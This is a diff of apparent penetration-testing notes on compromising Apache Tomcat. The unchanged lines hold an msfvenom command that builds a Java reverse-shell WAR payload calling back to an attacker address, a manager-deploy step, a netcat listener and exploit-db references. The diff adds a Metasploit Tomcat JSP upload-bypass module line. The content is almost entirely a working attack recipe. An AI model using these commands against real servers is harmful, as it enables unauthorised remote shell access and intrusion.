@@ -18,7 +18,7 @@ $ msfvenom -p java/shell_reverse_tcp lhost=192.168.1.1 lport=80 -f war -o pwn.wa
 
 Browse -> Deploy
 
-nc -nvlp 80&#x20;
+nc -nvlp 80
 
 http://192.168.1.2:8080/pwn/
 
@@ -26,3 +26,5 @@ http://192.168.1.2:8080/pwn/
 
 [https://www.exploit-db.com/exploits/42966\
 https://www.exploit-db.com/exploits/42953](https://www.exploit-db.com/exploits/42966https://www.exploit-db.com/exploits/42953)
+
+msf6 exploit(multi/http/tomcat\_jsp\_upload\_bypass)
